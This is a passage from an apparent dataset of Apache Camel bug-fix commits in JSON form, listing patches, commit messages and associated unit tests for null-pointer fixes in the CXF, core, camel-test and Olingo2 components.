                "filename": "components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageWithoutSEIRouterTest.java",
                "patch": "@@ -0,0 +1,50 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.cxf;\n+\n+import javax.xml.ws.Endpoint;\n+\n+import org.apache.hello_world_soap_http.GreeterImpl;\n+import org.junit.AfterClass;\n+import org.junit.BeforeClass;\n+import org.springframework.context.support.ClassPathXmlApplicationContext;\n+\n+public class CxfGreeterCXFMessageWithoutSEIRouterTest extends CxfGreeterCXFMessageRouterTest {\n+    \n+    protected static Endpoint endpoint;\n+    @AfterClass\n+    public static void stopService() {\n+        if (endpoint != null) {\n+            endpoint.stop();\n+        }\n+    }\n+\n+\n+    @BeforeClass\n+    public static void startService() {\n+        Object implementor = new GreeterImpl();\n+        String address = \"http://localhost:\" + getPort1() \n+            + \"/CxfGreeterCXFMessageWithoutSEIRouterTest/SoapContext/SoapPort\";\n+        endpoint = Endpoint.publish(address, implementor); \n+    }\n+    \n+    @Override\n+    protected ClassPathXmlApplicationContext createApplicationContext() {\n+        return new ClassPathXmlApplicationContext(\"org/apache/camel/component/cxf/GreeterEndpointCxfMessageWithoutSEIBeans.xml\");\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/test/java/org/apache/camel/component/cxf/CxfGreeterCXFMessageWithoutSEIRouterTest.java",
                "sha": "cbc809f94d624507fac629085dda6aaa825138a9",
                "status": "added"
            },
            {
                "additions": 47,
                "blob_url": "https://github.com/apache/camel/blob/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEndpointCxfMessageWithoutSEIBeans.xml",
                "changes": 47,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEndpointCxfMessageWithoutSEIBeans.xml?ref=4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4",
                "deletions": 0,
                "filename": "components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEndpointCxfMessageWithoutSEIBeans.xml",
                "patch": "@@ -0,0 +1,47 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n+<!--\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+    http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+-->\n+<beans xmlns=\"http://www.springframework.org/schema/beans\"\n+       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n+       xmlns:cxf=\"http://camel.apache.org/schema/cxf\"\n+\n+       xsi:schemaLocation=\"\n+       http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n+       http://camel.apache.org/schema/cxf http://camel.apache.org/schema/cxf/camel-cxf.xsd\n+       http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd\n+    \">\n+\n+    <bean class=\"org.springframework.beans.factory.config.PropertyPlaceholderConfigurer\"/>\n+\n+\n+   <cxf:cxfEndpoint id=\"routerEndpoint\" address=\"http://localhost:${CXFTestSupport.port2}/CxfGreeterCXFMessageWithoutSEIRouterTest/CamelContext/RouterPort\"\n+    \t\twsdlURL=\"testutils/hello_world.wsdl\"\n+    \t\tendpointName=\"s:SoapPort\"\n+    \t\tserviceName=\"s:SOAPService\"\n+    \t    xmlns:s=\"http://apache.org/hello_world_soap_http\"\n+    \t\tloggingFeatureEnabled=\"true\">\n+   </cxf:cxfEndpoint>\n+\n+   <cxf:cxfEndpoint id=\"serviceEndpoint\" address=\"http://localhost:${CXFTestSupport.port1}/CxfGreeterCXFMessageWithoutSEIRouterTest/SoapContext/SoapPort\"\n+    \t\twsdlURL=\"testutils/hello_world.wsdl\"\n+    \t\tendpointName=\"s:SoapPort\"\n+    \t\tserviceName=\"s:SOAPService\"\n+    \txmlns:s=\"http://apache.org/hello_world_soap_http\" >\n+    \t\n+   </cxf:cxfEndpoint>\n+\n+</beans>\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/4559a6a3e2885c3c6ba58a693527f4d3ef5d3ec4/components/camel-cxf/src/test/resources/org/apache/camel/component/cxf/GreeterEndpointCxfMessageWithoutSEIBeans.xml",
                "sha": "5d91e8dd3484b2d8f9438590ca91c6c1c310743e",
                "status": "added"
            }
        ],
        "message": "CAMEL-6243 Fixed the NPE of ClientFaultConverter when receiving a soapfault with the CFX_MESSAGE dataformat",
        "parent": "https://github.com/apache/camel/commit/b176b5fb29d26f46694e968d6a4403f276908d5e",
        "patched_files": [
            "CXFMessageDataFormatFeature.java",
            "PayLoadDataFormatFeature.java",
            "AbstractDataFormatFeature.java",
            "GreeterEndpointCxfMessageWithoutSEIBeans.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CxfGreeterCXFMessageWithoutSEIRouterTest.java",
            "CxfGreeterCXFMessageRouterTest.java"
        ]
    },
    "camel_46f429b": {
        "bug_id": "camel_46f429b",
        "commit": "https://github.com/apache/camel/commit/46f429b3b11916eb6b4cb1898beb33174dbb76c6",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/46f429b3b11916eb6b4cb1898beb33174dbb76c6/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=46f429b3b11916eb6b4cb1898beb33174dbb76c6",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -878,7 +878,8 @@ public Processor getProcessor(String id) {\n         Processor processor = getProcessor(id);\n         ProcessorDefinition def = getProcessorDefinition(id);\n \n-        if (processor != null && def != null) {\n+        // processor may be null if its anonymous inner class or as lambda\n+        if (def != null) {\n             try {\n                 ObjectName on = getManagementStrategy().getManagementNamingStrategy().getObjectNameForProcessor(this, processor, def);\n                 return getManagementStrategy().getManagementAgent().newProxyClient(on, type);",
                "raw_url": "https://github.com/apache/camel/raw/46f429b3b11916eb6b4cb1898beb33174dbb76c6/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "13cf55b18d46e079874609f12fe2c3c5516381b1",
                "status": "modified"
            },
            {
                "additions": 71,
                "blob_url": "https://github.com/apache/camel/blob/46f429b3b11916eb6b4cb1898beb33174dbb76c6/camel-core/src/test/java/org/apache/camel/management/ManagedInlinedProcessorTest.java",
                "changes": 71,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/management/ManagedInlinedProcessorTest.java?ref=46f429b3b11916eb6b4cb1898beb33174dbb76c6",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/management/ManagedInlinedProcessorTest.java",
                "patch": "@@ -0,0 +1,71 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.management;\n+\n+import javax.management.MBeanServer;\n+import javax.management.ObjectName;\n+\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Processor;\n+import org.apache.camel.api.management.mbean.ManagedProcessorMBean;\n+import org.apache.camel.builder.RouteBuilder;\n+\n+/**\n+ * @version \n+ */\n+public class ManagedInlinedProcessorTest extends ManagementTestSupport {\n+\n+    public void testManageInlinedProcessor() throws Exception {\n+        // JMX tests dont work well on AIX CI servers (hangs them)\n+        if (isPlatform(\"aix\")) {\n+            return;\n+        }\n+\n+        MBeanServer mbeanServer = getMBeanServer();\n+        ObjectName on = ObjectName.getInstance(\"org.apache.camel:context=camel-1,type=processors,name=\\\"custom\\\"\");\n+\n+        getMockEndpoint(\"mock:result\").expectedMessageCount(1);\n+        template.sendBody(\"direct:start\", \"Hello World\");\n+        assertMockEndpointsSatisfied();\n+\n+        Long counter = (Long) mbeanServer.getAttribute(on, \"ExchangesCompleted\");\n+        assertEquals(1L, counter.longValue());\n+\n+        ManagedProcessorMBean mb = context.getManagedProcessor(\"custom\", ManagedProcessorMBean.class);\n+        assertNotNull(mb);\n+        assertEquals(1L, mb.getExchangesCompleted());\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:start\").routeId(\"foo\")\n+                    .process(new Processor() {\n+                        @Override\n+                        public void process(Exchange exchange) throws Exception {\n+                            exchange.getOut().setBody(\"Bye World\");\n+                        }\n+                    }).id(\"custom\")\n+                    .to(\"mock:result\");\n+            }\n+        };\n+    }\n+\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/46f429b3b11916eb6b4cb1898beb33174dbb76c6/camel-core/src/test/java/org/apache/camel/management/ManagedInlinedProcessorTest.java",
                "sha": "9604fe59a42a372f5746ce71f681ff21ee5fcf8b",
                "status": "added"
            },
            {
                "additions": 22,
                "blob_url": "https://github.com/apache/camel/blob/46f429b3b11916eb6b4cb1898beb33174dbb76c6/components/camel-test/src/main/java/org/apache/camel/test/junit4/CamelTestSupport.java",
                "changes": 42,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-test/src/main/java/org/apache/camel/test/junit4/CamelTestSupport.java?ref=46f429b3b11916eb6b4cb1898beb33174dbb76c6",
                "deletions": 20,
                "filename": "components/camel-test/src/main/java/org/apache/camel/test/junit4/CamelTestSupport.java",
                "patch": "@@ -23,6 +23,7 @@\n import java.io.OutputStream;\n import java.util.ArrayList;\n import java.util.Collections;\n+import java.util.Comparator;\n import java.util.HashMap;\n import java.util.Hashtable;\n import java.util.List;\n@@ -460,11 +461,14 @@ private void logCoverageSummary(ManagedCamelContextMBean managedCamelContext) th\n             routesSummary.append(\"\\t\\tRoute \").append(route.getId()).append(\" total: \").append(managedRoute.getExchangesTotal()).append(\" (\").append(routeCoveragePercentage).append(\"%)\\n\");\n \n             if (server != null) {\n-                for (ManagedProcessorMBean managedProcessor : processorsForRoute.get(route.getId())) {\n-                    String processorId = managedProcessor.getProcessorId();\n-                    long processorExchangesTotal = managedProcessor.getExchangesTotal();\n-                    long processorCoveragePercentage = Math.round((double) processorExchangesTotal / contextExchangesTotal * 100);\n-                    routesSummary.append(\"\\t\\t\\tProcessor \").append(processorId).append(\" total: \").append(processorExchangesTotal).append(\" (\").append(processorCoveragePercentage).append(\"%)\\n\");\n+                List<ManagedProcessorMBean> processors = processorsForRoute.get(route.getId());\n+                if (processors != null) {\n+                    for (ManagedProcessorMBean managedProcessor : processors) {\n+                        String processorId = managedProcessor.getProcessorId();\n+                        long processorExchangesTotal = managedProcessor.getExchangesTotal();\n+                        long processorCoveragePercentage = Math.round((double) processorExchangesTotal / contextExchangesTotal * 100);\n+                        routesSummary.append(\"\\t\\t\\tProcessor \").append(processorId).append(\" total: \").append(processorExchangesTotal).append(\" (\").append(processorCoveragePercentage).append(\"%)\\n\");\n+                    }\n                 }\n             }\n         }\n@@ -496,30 +500,28 @@ private void logCoverageSummary(ManagedCamelContextMBean managedCamelContext) th\n         ObjectName processorsObjectName = new ObjectName(domain + \":context=\" + context.getManagementName() + \",type=processors,name=*\");\n         Set<ObjectName> objectNames = server.queryNames(processorsObjectName, null);\n \n-        if (server != null) {\n-            for (ObjectName objectName : objectNames) {\n-                String routeId = server.getAttribute(objectName, \"RouteId\").toString();\n-                String name = objectName.getKeyProperty(\"name\");\n-                name = ObjectName.unquote(name);\n+        for (ObjectName objectName : objectNames) {\n+            String routeId = server.getAttribute(objectName, \"RouteId\").toString();\n+            String name = objectName.getKeyProperty(\"name\");\n+            name = ObjectName.unquote(name);\n \n-                ManagedProcessorMBean managedProcessor = context.getManagedProcessor(name, ManagedProcessorMBean.class);\n+            ManagedProcessorMBean managedProcessor = context.getManagedProcessor(name, ManagedProcessorMBean.class);\n \n-                if (managedProcessor != null) {\n-                    if (processorsForRoute.get(routeId) == null) {\n-                        List<ManagedProcessorMBean> processorsList = new ArrayList<>();\n-                        processorsList.add(managedProcessor);\n+            if (managedProcessor != null) {\n+                if (processorsForRoute.get(routeId) == null) {\n+                    List<ManagedProcessorMBean> processorsList = new ArrayList<>();\n+                    processorsList.add(managedProcessor);\n \n-                        processorsForRoute.put(routeId, processorsList);\n-                    } else {\n-                        processorsForRoute.get(routeId).add(managedProcessor);\n-                    }\n+                    processorsForRoute.put(routeId, processorsList);\n+                } else {\n+                    processorsForRoute.get(routeId).add(managedProcessor);\n                 }\n             }\n         }\n \n         // sort processors by position in route definition\n         for (Map.Entry<String, List<ManagedProcessorMBean>> entry : processorsForRoute.entrySet()) {\n-            Collections.sort(entry.getValue(), (o1, o2) -> o1.getIndex().compareTo(o2.getIndex()));\n+            Collections.sort(entry.getValue(), Comparator.comparing(ManagedProcessorMBean::getIndex));\n         }\n \n         return processorsForRoute;",
                "raw_url": "https://github.com/apache/camel/raw/46f429b3b11916eb6b4cb1898beb33174dbb76c6/components/camel-test/src/main/java/org/apache/camel/test/junit4/CamelTestSupport.java",
                "sha": "632b8b07277a92df6d4cecfe2a1621913bdfe7ce",
                "status": "modified"
            },
            {
                "additions": 56,
                "blob_url": "https://github.com/apache/camel/blob/46f429b3b11916eb6b4cb1898beb33174dbb76c6/components/camel-test/src/test/java/org/apache/camel/test/patterns/RouteProcessorDumpRouteCoverageTest.java",
                "changes": 56,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-test/src/test/java/org/apache/camel/test/patterns/RouteProcessorDumpRouteCoverageTest.java?ref=46f429b3b11916eb6b4cb1898beb33174dbb76c6",
                "deletions": 0,
                "filename": "components/camel-test/src/test/java/org/apache/camel/test/patterns/RouteProcessorDumpRouteCoverageTest.java",
                "patch": "@@ -0,0 +1,56 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.test.patterns;\n+\n+import org.apache.camel.RoutesBuilder;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.test.junit4.CamelTestSupport;\n+import org.junit.Test;\n+\n+public class RouteProcessorDumpRouteCoverageTest extends CamelTestSupport {\n+\n+    @Override\n+    public boolean isDumpRouteCoverage() {\n+        return true;\n+    }\n+\n+    @Test\n+    public void testProcessor() throws Exception {\n+        String out = template.requestBody(\"direct:start\", \"Hello World\", String.class);\n+        assertEquals(\"Bye World\", out);\n+    }\n+\n+    @Override\n+    public void tearDown() throws Exception {\n+        super.tearDown();\n+\n+        // should create that file when test is done\n+        assertFileExists(\"target/camel-route-coverage/RouteProcessorDumpRouteCoverageTest-testProcessor.xml\");\n+    }\n+\n+    @Override\n+    protected RoutesBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:start\")\n+                    .process(exchange -> exchange.getOut().setBody(\"Bye World\"));\n+            }\n+        };\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/46f429b3b11916eb6b4cb1898beb33174dbb76c6/components/camel-test/src/test/java/org/apache/camel/test/patterns/RouteProcessorDumpRouteCoverageTest.java",
                "sha": "9ad0b84a77c0a8494485bf68ce048b06100e112f",
                "status": "added"
            }
        ],
        "message": "CAMEL-11305: camel-test - Using dump route coverage with custom processor may cause NPE",
        "parent": "https://github.com/apache/camel/commit/a724619a0622b1747a146138d7fbe0243f9a3bf1",
        "patched_files": [
            "CamelTestSupport.java",
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java",
            "CamelTestSupportTest.java",
            "RouteProcessorDumpRouteCoverageTest.java",
            "ManagedInlinedProcessorTest.java"
        ]
    },
    "camel_482cf92": {
        "bug_id": "camel_482cf92",
        "commit": "https://github.com/apache/camel/commit/482cf923bc47d2b1e025dfd109fb28ce40ec1af6",
        "file": [
            {
                "additions": 70,
                "blob_url": "https://github.com/apache/camel/blob/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo2/camel-olingo2-component/src/main/java/org/apache/camel/component/olingo2/Olingo2Index.java",
                "changes": 71,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-olingo2/camel-olingo2-component/src/main/java/org/apache/camel/component/olingo2/Olingo2Index.java?ref=482cf923bc47d2b1e025dfd109fb28ce40ec1af6",
                "deletions": 1,
                "filename": "components/camel-olingo2/camel-olingo2-component/src/main/java/org/apache/camel/component/olingo2/Olingo2Index.java",
                "patch": "@@ -18,18 +18,48 @@\n \n import java.lang.reflect.Array;\n import java.util.ArrayList;\n+import java.util.Collections;\n import java.util.HashSet;\n import java.util.List;\n import java.util.Set;\n \n import org.apache.olingo.odata2.api.ep.entry.EntryMetadata;\n import org.apache.olingo.odata2.api.ep.entry.ODataEntry;\n+import org.apache.olingo.odata2.api.ep.feed.FeedMetadata;\n import org.apache.olingo.odata2.api.ep.feed.ODataFeed;\n \n public class Olingo2Index {\n \n     private Set<Integer> resultIndex = new HashSet<>();\n \n+    private class EmptyODataFeed implements ODataFeed {\n+\n+        @Override\n+        public List<ODataEntry> getEntries() {\n+            return Collections.emptyList();\n+        }\n+\n+        @Override\n+        public FeedMetadata getFeedMetadata() {\n+            return new FeedMetadata() {\n+                @Override\n+                public String getDeltaLink() {\n+                    return null;\n+                }\n+\n+                @Override\n+                public Integer getInlineCount() {\n+                    return 0;\n+                }\n+\n+                @Override\n+                public String getNextLink() {\n+                    return null;\n+                }\n+            };\n+        }\n+    }\n+\n     /**\n      * Hash only certain data since other parts change between message\n      * exchanges.\n@@ -66,18 +96,41 @@ private int hash(ODataEntry entry) {\n     }\n \n     private Object filter(Object o) {\n-        if (resultIndex.contains(o.hashCode())) {\n+        if (o == null || resultIndex.contains(o.hashCode())) {\n             return null;\n         }\n         return o;\n     }\n \n     private void indexDefault(Object o) {\n+        if (o == null) {\n+            return;\n+        }\n+\n         resultIndex.add(o.hashCode());\n     }\n \n+    private Object filter(ODataEntry entry) {\n+        if (entry == null || resultIndex.contains(hash(entry))) {\n+            return null;\n+        }\n+        return entry;\n+    }\n+\n+    private void index(ODataEntry entry) {\n+        if (entry == null) {\n+            return;\n+        }\n+\n+        resultIndex.add(hash(entry));\n+    }\n+\n     private Iterable<?> filter(Iterable<?> iterable) {\n         List<Object> filtered = new ArrayList<>();\n+        if (iterable == null) {\n+            return filtered;\n+        }\n+\n         for (Object o : iterable) {\n             if (resultIndex.contains(o.hashCode())) {\n                 continue;\n@@ -89,12 +142,20 @@ private void indexDefault(Object o) {\n     }\n \n     private void index(Iterable<?> iterable) {\n+        if (iterable == null) {\n+            return;\n+        }\n+\n         for (Object o : iterable) {\n             resultIndex.add(o.hashCode());\n         }\n     }\n \n     private ODataFeed filter(ODataFeed odataFeed) {\n+        if (odataFeed == null) {\n+            return new EmptyODataFeed();\n+        }\n+\n         List<ODataEntry> entries = odataFeed.getEntries();\n \n         if (entries.isEmpty()) {\n@@ -113,6 +174,10 @@ private ODataFeed filter(ODataFeed odataFeed) {\n     }\n \n     private void index(ODataFeed odataFeed) {\n+        if (odataFeed == null) {\n+            return;\n+        }\n+\n         for (ODataEntry entry : odataFeed.getEntries()) {\n             resultIndex.add(hash(entry));\n         }\n@@ -126,6 +191,8 @@ public void index(Object result) {\n             index((ODataFeed)result);\n         } else if (result instanceof Iterable) {\n             index((Iterable<?>)result);\n+        } else if (result instanceof ODataEntry) {\n+            index((ODataEntry)result);\n         } else {\n             indexDefault(result);\n         }\n@@ -144,6 +211,8 @@ public Object filterResponse(Object response) {\n                 result.add(Array.get(response, i));\n             }\n             response = filter(result);\n+        } else if (response instanceof ODataEntry) {\n+            response = filter((ODataEntry) response);\n         } else {\n             response = filter(response);\n         }",
                "raw_url": "https://github.com/apache/camel/raw/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo2/camel-olingo2-component/src/main/java/org/apache/camel/component/olingo2/Olingo2Index.java",
                "sha": "b541efe4134210e3626c59a4bd2fe661b79b0a0f",
                "status": "modified"
            },
            {
                "additions": 234,
                "blob_url": "https://github.com/apache/camel/blob/482cf923bc47d2b1e025dfd109fb28ce40ec1af6/components/camel-olingo2/camel-olingo2-component/src/test/java/org/apache/camel/component/olingo2/Olingo2ComponentConsumerTest.java",
                "changes": 234,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-olingo2/camel-olingo2-component/src/test/java/org/apache/camel/component/olingo2/Olingo2ComponentConsumerTest.java?ref=482cf923bc47d2b1e025dfd109fb28ce40ec1af6",
                "deletions": 0,
                "filename": "components/camel-olingo2/camel-olingo2-component/src/test/java/org/apache/camel/component/olingo2/Olingo2ComponentConsumerTest.java",
                "patch": "@@ -0,0 +1,234 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.olingo2;\n+\n+import java.util.Map;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.test.AvailablePortFinder;\n+import org.apache.olingo.odata2.api.ep.entry.ODataEntry;\n+import org.apache.olingo.odata2.api.ep.feed.ODataFeed;\n+import org.junit.AfterClass;\n+import org.junit.BeforeClass;\n+import org.junit.Test;\n+\n+/**\n+ * Test class for {@link org.apache.camel.component.olingo2.api.Olingo2App} APIs.\n+ * <p>\n+ * The integration test runs against Apache Olingo 2.0 sample server\n+ * which is dynamically installed and started during the test.\n+ * </p>\n+ */\n+public class Olingo2ComponentConsumerTest extends AbstractOlingo2TestSupport {\n+\n+    private static final int PORT = AvailablePortFinder.getNextAvailable();\n+    private static final String TEST_SERVICE_URL = \"http://localhost:\" + PORT + \"/MyFormula.svc\";\n+\n+    private static Olingo2SampleServer server;\n+\n+    public Olingo2ComponentConsumerTest() {\n+        setDefaultTestProperty(\"serviceUri\", \"http://localhost:\" + PORT + \"/MyFormula.svc\");\n+    }\n+\n+    @BeforeClass\n+    public static void beforeClass() throws Exception {\n+        startServers(PORT);\n+        Olingo2SampleServer.generateSampleData(TEST_SERVICE_URL);\n+    }\n+\n+    @AfterClass\n+    public static void afterClass() throws Exception {\n+        if (server != null) {\n+            server.stop();\n+            server.destroy();\n+        }\n+    }\n+\n+    protected static void startServers(int port) throws Exception {\n+        server = new Olingo2SampleServer(port, \"/olingo2_ref\");\n+        server.start();\n+    }\n+\n+    private void addRouteAndStartContext(RouteBuilder builder) throws Exception {\n+        context().addRoutes(builder);\n+        startCamelContext();\n+    }\n+\n+    /**\n+     * Read entity set of the People object\n+     * and filter already seen items on subsequent exchanges\n+     * Use a delay since the mock endpoint does not always get\n+     * the correct number of exchanges before being satisfied.\n+     *\n+     * Note:\n+     * - consumer.splitResults is set to false since this ensures the first returned message\n+     *   contains all the results. This is preferred for the purposes of this test. The default\n+     *   will mean the first n messages contain the results (where n is the result total) then\n+     *   subsequent messages will be empty\n+     */\n+    @Test\n+    public void testConsumerReadFilterAlreadySeen() throws Exception {\n+        int expectedMsgCount = 3;\n+        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-alreadyseen\");\n+        mockEndpoint.expectedMessageCount(expectedMsgCount);\n+        mockEndpoint.setResultWaitTime(60000);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo2://read/Manufacturers?filterAlreadySeen=true&\"\n+                        + \"consumer.delay=2&consumer.sendEmptyMessageWhenIdle=true&\"\n+                        + \"consumer.splitResult=false\")\n+                    .to(\"mock:consumer-alreadyseen\");\n+            };\n+        };\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+\n+        for (int i = 0; i < expectedMsgCount; ++i) {\n+            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n+\n+            if (i == 0) {\n+                //\n+                // First polled messages contained all the manufacturers\n+                //\n+                assertTrue(body instanceof ODataFeed);\n+                ODataFeed set = (ODataFeed) body;\n+                assertTrue(set.getEntries().size() > 0);\n+            } else {\n+                //\n+                // Subsequent polling messages should be empty\n+                // since the filterAlreadySeen property is true\n+                //\n+                assertNull(body);\n+            }\n+        }\n+    }\n+\n+    @Test\n+    public void testConsumerReadFilterAlreadySeenWithPredicateAndSplitResults() throws Exception {\n+        int expectedMsgCount = 3;\n+        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-splitresult-kp-manufacturer\");\n+        mockEndpoint.expectedMinimumMessageCount(expectedMsgCount);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo2://read/Manufacturers('1')?filterAlreadySeen=true&\"\n+                        + \"consumer.delay=2&consumer.sendEmptyMessageWhenIdle=true&\"\n+                        + \"consumer.splitResult=true\")\n+                    .to(\"mock:consumer-splitresult-kp-manufacturer\");\n+            };\n+        };\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+\n+        for (int i = 0; i < expectedMsgCount; ++i) {\n+            Object body = mockEndpoint.getExchanges().get(i).getIn().getBody();\n+\n+            if (i == 0) {\n+                //\n+                // First polled messages contained all the entities\n+                //\n+                assertTrue(body instanceof ODataEntry);\n+                ODataEntry entry = (ODataEntry) body;\n+                Object nameValue = entry.getProperties().get(\"Name\");\n+                assertNotNull(nameValue);\n+                assertEquals(\"Star Powered Racing\", nameValue.toString());\n+            } else {\n+                //\n+                // Subsequent polling messages should be empty\n+                // since the filterAlreadySeen property is true\n+                //\n+                assertNull(body);\n+            }\n+        }\n+    }\n+\n+    /**\n+     * Read value of the People object and split the results\n+     * into individual messages\n+     */\n+    @SuppressWarnings(\"unchecked\")\n+    @Test\n+    public void testConsumerReadClientValuesSplitResults() throws Exception {\n+        MockEndpoint mockEndpoint = getMockEndpoint(\"mock:consumer-value\");\n+        mockEndpoint.expectedMinimumMessageCount(1);\n+        mockEndpoint.setResultWaitTime(60000);\n+\n+        RouteBuilder builder = new RouteBuilder() {\n+            public void configure() {\n+                from(\"olingo2://read/Manufacturers('1')/Address?consumer.splitResult=true\")\n+                    .to(\"mock:consumer-value\");\n+            };\n+        };\n+        addRouteAndStartContext(builder);\n+\n+        mockEndpoint.assertIsSatisfied();\n+        //\n+        // 1 individual message in the exchange\n+        //\n+        Object body = mockEndpoint.getExchanges().get(0).getIn().getBody();\n+        assertIsInstanceOf(Map.class, body);\n+        Map<String, Object> value = (Map<String, Object>) body;\n+        Object addrObj = value.get(\"Address\");\n+        assertIsInstanceOf(Map.class, addrObj);\n+        Map<String, Object> addrMap = (Map<String, Object>) addrObj;\n+        assertEquals(\"70173\", addrMap.get(\"ZipCode\"));\n+        assertEquals(\"Star Street 137\", addrMap.get(\"Street\"));\n+        assertEquals(\"Germany\", addrMap.get(\"Country\"));\n+        assertEquals(\"Stuttgart\", addrMap.get(\"City\"));\n+    }\n+\n+    /**\n+     * Read entity set of the Manufacturers object and split the results\n+     * into individual messages\n+     */\n+    @Test\n+    public void testConsumerReadSplitResults() throws Exception {\n+        int expectedMsgCount = 2;\n+        MockEndpoint 